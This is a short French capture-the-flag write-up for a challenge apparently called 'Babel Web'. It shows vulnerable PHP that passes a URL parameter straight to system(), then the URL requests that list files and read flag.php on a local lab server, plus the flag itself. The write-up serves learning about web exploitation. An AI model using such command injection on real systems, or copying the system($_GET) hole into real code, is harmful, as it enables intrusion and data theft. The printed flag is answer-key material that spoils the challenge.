# Analyse
J'ai commencé par faire une analyse de la page web.

Je remarque ici qu'il y a une balise href en commentaire :
```html
<head>
	<title>Bienvenue à Babel Web!</title>
</head>
<body>
	<h1>Bienvenue à Babel Web!</h1>
	La page est en cours de développement, merci de revenir plus tard.
	<!-- <a href="?source=1">source</a> -->
</body>
```

# Solution
J'ai donc enlevé les commentaires afin de me rendre sur le lien. Une fois sur la nouvelle page, du PHP apparaît :
```html
<?php
    if (isset($_GET['source'])) {
        @show_source(__FILE__);
    }  else if(isset($_GET['code'])) {
        print("<pre>");
        @system($_GET['code']);
        print("<pre>");
    } else {
?>
<html>
    <head>
        <title>Bienvenue à Babel Web!</title>
    </head>    
    <body>
        <h1>Bienvenue à Babel Web!</h1>
        La page est en cours de développement, merci de revenir plus tard.
        <!-- <a href="?source=1">source</a> -->
    </body>
</html>
<?php
    }
?>
```
Dans le code PHP, je remarque ce code la : ***($_GET['code'])*** permet d'exécuter des commandes système directement en passant des valeurs via la variable.

En accédant à cette URL : http://localhost:8000/?code=ls, on obtient deux fichiers : flag.php et index.php.

Je vais aller chercher le flag dans le fichier via la commande :

http://localhost:8000/?code=cat%20flag.php

Ici, une page blanche s'affiche et si l'on regarde dans le code source, alors on trouve le flag :
```html
<pre>
  <!--?php
	$flag = "FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}";
  <pre-->
</pre>
```